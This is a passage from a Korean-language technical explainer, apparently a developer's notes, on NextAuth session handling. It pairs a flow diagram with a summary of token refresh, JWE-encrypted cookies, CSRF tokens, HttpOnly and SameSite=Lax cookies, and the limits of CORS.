│        │  │     ├─ 토큰 만료 확인 (5분 버퍼)            │        │
│        │  │     └─ 만료 시 → refreshAccessToken() ──────┼──→ 백엔드
│        │  │  3. session 콜백 실행                       │        │
│        │  │     └─ JWT → Session 변환                   │        │
│        └──┤  4. Session 반환                            │        │
│           └─────────────────────────────────────────────┘        │
│                                                                  │
│  signIn('credentials') ──→ authorize() ──→ POST /v1/login ──→ 백엔드
│                                  ↓                               │
│                            User 반환                             │
│                                  ↓                               │
│                            jwt 콜백 (초기)                       │
│                                  ↓                               │
│                       쿠키에 JWT 암호화 저장                     │
└──────────────────────────────────────────────────────────────────┘
```

## 요약

- **NextAuth의 역할**: 세션 관리 프록시. 실제 인증은 백엔드 API가 수행하고, NextAuth는 토큰을 암호화된 쿠키(JWE)로 안전하게 관리한다
- **API Route (`[...nextauth]`)**: Catch-All Dynamic Route로 `/api/auth/*` 경로를 모두 캐치하여 세션 조회, 로그인, 로그아웃, CSRF 토큰 등을 자동으로 처리한다
- **JWT 콜백**: 매 요청마다 실행되며, 백엔드 토큰의 만료를 5분 버퍼로 선제 확인하고 자동 갱신한다. 사용자는 토큰 갱신을 인지하지 못한다
- **Session 콜백**: JWT → Session 변환 시 refreshToken을 의도적으로 제외하여 클라이언트 노출을 방지한다
- **CSRF 방어**: 공격자는 Same-Origin Policy로 인해 CSRF 토큰을 알 수 없으므로 위조 요청이 거부된다
- **HttpOnly Cookie**: JavaScript에서 쿠키 접근을 차단하여 XSS 공격으로 세션 탈취를 방지한다. 클라이언트는 `useSession()` → HTTP 요청 → 서버 복호화 → JSON 응답 경로로 세션 정보를 얻는다
- **SameSite=Lax**: 크로스 사이트 POST 요청에 쿠키를 포함하지 않아 CSRF를 방어하면서도, GET 최상위 탐색에는 쿠키를 포함하여 외부 링크 클릭 시 로그인 상태를 유지한다
- **CORS 한계**: `<form>` POST 같은 Simple Request는 CORS가 막지 못하므로 SameSite + CSRF 토큰이 필수이다
- **이중 JWT**: 백엔드 JWT(서명만, 프론트에서 payload 읽기용)와 NextAuth JWT(JWE 암호화, 세션 쿠키용)가 별도로 존재한다
- **5중 보안 계층**: HttpOnly/Secure 쿠키 → SameSite=Lax → CSRF 토큰 → JWE 암호화 → refreshToken 미노출
